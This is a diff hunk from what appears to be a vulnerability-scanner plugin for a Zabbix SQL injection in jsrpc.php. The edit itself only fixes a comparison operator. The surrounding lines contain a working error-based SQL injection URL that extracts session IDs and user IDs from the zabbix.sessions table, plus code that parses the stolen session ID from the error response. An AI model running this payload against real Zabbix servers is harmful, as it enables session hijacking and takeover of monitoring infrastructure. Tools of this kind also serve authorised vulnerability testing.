@@ -29,7 +29,7 @@ class zabbix_jsrpc_profileIdx2_sqli_BaseVerify:
                 requests.post('http://localhost:8848/system', json=postdata) 
             vulnurl = self.url + "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1%20or%20(select%201%20from%20(select%20count(*),concat((select%20(select%20concat(sessionid,0x7e7e7e,userid,0x7e7e7e,status))%20from%20zabbix.sessions%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20or%201=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
-            if req.text.find("Duplicate entry") is not -1:
+            if req.text.find("Duplicate entry") != -1:
                 start = req.text.find("Duplicate entry")
                 end = req.text.find("~~~")
                 sessionid = str(req.text)[start:end].strip("Duplicate entry '")
